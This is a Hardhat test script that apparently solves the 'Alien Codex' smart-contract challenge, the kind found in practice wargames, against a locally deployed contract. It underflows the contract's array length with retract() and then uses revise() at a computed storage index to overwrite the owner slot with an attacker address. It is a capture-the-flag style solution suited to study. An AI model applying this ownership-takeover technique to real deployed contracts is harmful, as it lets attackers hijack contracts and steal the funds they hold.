import { expect } from "chai";
import { ethers } from "hardhat";

describe("Alien Codex", function () {
  it("Should change owner", async function () {

    const [_, owner, attacker] = await ethers.getSigners()

    // deploy contract
    const AlienCodex = await ethers.getContractFactory("AlienCodex");
    const alienCodex = await AlienCodex.connect(owner).deploy();
    await alienCodex.deployed();

    const INSTANCE_ADDRESS = alienCodex.address

    const printStorage = async () => {

      const slot1 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 0)
      const slot2 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 1)
      const slot3 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 2)
      const slot4 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 3)
      const slot5 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 4)
      const slot6 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 5)


      console.log(slot1)
      console.log(slot2)
      console.log(slot3)
      console.log(slot4)
      console.log(slot5)
      console.log(slot6)
      console.log("\n\n\n")
    }

    await printStorage()

    const makeContactTx = await alienCodex.make_contact()
    await makeContactTx.wait(1)
    await printStorage()

    // pop underflow
    const popOnce = await alienCodex.retract()
    await popOnce.wait(1)

    // const addRecordTx = await alienCodex.record("0x0000000000000000000000000000000000000000000000000000000000abcdef")
    // addRecordTx.wait(1)

    await printStorage()

    const payload = "0x" + "0".repeat(64 - (1 + 40)) + "1" + attacker.address.slice(2)
    const magicIndex = "0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a"
    const reviseTx = await alienCodex.revise(magicIndex, payload)
    await reviseTx.wait(1)
    await printStorage()

  });
});
